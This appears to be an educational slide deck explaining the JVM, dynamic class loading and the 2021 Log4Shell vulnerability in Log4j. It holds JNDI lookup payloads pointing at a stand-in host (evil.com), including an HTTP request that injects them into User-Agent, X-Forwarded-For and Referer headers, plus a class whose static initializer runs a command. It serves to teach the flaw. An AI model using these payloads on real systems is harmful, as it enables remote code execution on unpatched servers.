What is the JVM?

The Java Virtual Machine — a runtime that executes Java programs.

Hello.java

⟶
javac
compiler
⟶
Hello.class

⟶

Write once, run anywhere — the JVM abstracts away the OS and CPU. The same .class file runs on Linux, Windows, macOS.

The JVM also handles memory (garbage collection), security (sandboxing), and dynamic class loading — that last one is important.

How is bytecode executed?

The JVM is a stack-based virtual machine. No registers — everything goes through the operand stack.

JAVA SOURCE 

int a = 2;
int b = 3;
int c = a + b;
JVM BYTECODE 

iconst_2       // push 2
istore_1       // store in local var 1 (a)
iconst_3       // push 3
istore_2       // store in local var 2 (b)
iload_1        // push a
iload_2        // push b
iadd           // pop both, push sum
istore_3       // store in local var 3 (c)

At first, the JVM interprets bytecode instruction by instruction. Hot methods get JIT-compiled to native machine code by HotSpot.

Dynamic Class Loading

The JVM can load new classes at runtime — not just from disk.


// Load a class by name at runtime
Class<?> cls = Class.forName("com.example.Plugin");

// Instantiate it
Object obj = cls.getDeclaredConstructor().newInstance();

Classes can be loaded from:

  • The local filesystem (.jar files)
  • Over the network via URLClassLoader
  • From a remote naming service via JNDI

When a class is loaded, its static initializer block runs immediately. 


public class Evil {
    static {
        // This runs the instant the class is loaded
        Runtime.getRuntime().exec("calc.exe");
    }
}

Code as Data

Log4j doesn't just write strings — it evaluates them.

Log4j supports lookups — expressions inside log messages that get resolved at log time:

${java:version} ⟶ Java 17.0.1
${env:USER} ⟶ root
${hostname} ⟶ prod-web-03
${jndi:ldap://evil/x} ⟶ ???

The lookup syntax ${prefix:name} treats the logged string as a template — part data, part code. And one of those prefixes lets you reach out to the network…

// Normal use: look up a database connection from a directory
Context ctx = new InitialContext();

But JNDI can also return a Reference — a pointer to a remote class file that the JVM will download and instantiate.

The attacker controls the LDAP server. The LDAP server tells the JVM: "the object you want is a class at http://evil.com/Exploit.class"

CVE-2021-44228: The Attack

All it takes is getting Log4j to log a string you control:

1 Attacker sends ${jndi:ldap://evil.com/x} as input
↓
2 Application logs the input — Log4j sees ${jndi:...} and resolves it
↓
3 JNDI connects to attacker's LDAP server
↓
4 LDAP responds: "load class from http://evil.com/Exploit.class"
↓
5 JVM downloads the class, loads it — static initializer executes
↓
6 Arbitrary code execution — reverse shell, cryptominer, ransomware, anything

Where was the bug?

In Log4j's MessagePatternConverter, roughly:


// Simplified from the actual Log4j source
public void format(LogEvent event, StringBuilder buf) {
    String msg = event.getMessage().getFormattedMessage();

    // Does the message contain ${...}?
    if (msg.contains("${")) {
        // Resolve ALL lookup expressions in the message
        msg = config.getStrSubstitutor().replace(event, msg);
    }

    buf.append(msg);
}

That's it. User-controlled data is passed through string substitution that supports JNDI lookups.

No sanitization. No allowlist. No opt-in. Enabled by default in every Log4j 2.x version from 2013 to December 2021.

Minecraft Java Edition uses Log4j. Chat messages are logged.

Server Logs the message ⟶ server-side RCE Other clients Render the message in chat ⟶ client-side RCE Sign-in screen Player name is logged on join ⟶ RCE on connect

Just typing in chat could compromise every player on the server.

${jndi:ldap://evil.com/pwn}

Why was this so bad?

Ubiquitous

Log4j ships in almost every Java application. Servers, embedded devices, cloud services.

Trivial

Exploitation is a single string. No authentication, no prior access, no special tools.

Hidden

Any input field that gets logged is an attack vector. HTTP headers, form fields, URLs.


GET / HTTP/1.1
Host: target.com
User-Agent: ${jndi:ldap://evil.com/ua}
X-Forwarded-For: ${jndi:ldap://evil.com/xff}
Referer: ${jndi:ldap://evil.com/ref}

Any HTTP header, query parameter, or form field that touches a log statement becomes an entry point. Attackers scanned the entire internet within hours of disclosure.
